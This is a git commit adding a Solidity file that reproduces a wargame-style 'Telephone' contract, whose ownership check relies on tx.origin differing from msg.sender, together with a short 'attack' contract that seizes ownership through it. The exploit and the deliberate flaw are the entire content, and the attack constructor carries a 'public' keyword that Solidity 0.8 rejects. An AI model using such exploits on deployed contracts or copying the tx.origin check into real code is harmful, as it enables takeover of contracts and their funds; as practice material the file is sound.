fa71489baa2b3a5f0dbc463533c19384d2b1f369
oh7887 <118185225+oh7887@users.noreply.github.com>
2023-02-25 17:49:07 +0800

    Create 8.sol

---
+++ 8.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+contract attack{
+  constructor(address add)public
+  {
+    Telephone tele = Telephone(add);
+    tele.changeOwner(msg.sender);
+  }
+}
